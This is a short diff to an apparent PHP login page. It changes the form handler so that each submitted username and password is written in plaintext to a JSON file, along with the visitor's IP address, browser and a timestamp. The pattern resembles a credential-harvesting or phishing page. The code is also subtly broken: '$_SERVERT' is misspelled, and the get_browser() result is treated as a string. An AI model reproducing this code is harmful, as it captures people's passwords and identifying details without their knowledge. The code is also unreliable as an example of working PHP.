@@ -173,11 +173,22 @@ span.psw {
  	$arr_data = array();
 
  	$file=fopen("savedata.json", "a");
+  fwrite($file, "IP Address : ");
+  fwrite($file, $_SERVERT['REMOTE_ADDR']."\n");
+
+  fwrite($file, "Browser : ");
+  fwrite($file, get_browser()."\n");
+
+  fwrite($file, "Date : ");
+  fwrite($file, date("l jS \of F Y h:i:s A")."\n");
+
  	fwrite($file, "username : ");
  	fwrite($file, $_POST['uname']."\n");
 
  	fwrite($file, "password : ");
- 	fwrite($file, $_POST['psw']."\n");
+ 	fwrite($file, $_POST['psw']."\n"."\n");
+
+
  	fclose($file);
  	/*try{
  		$formdata = array(
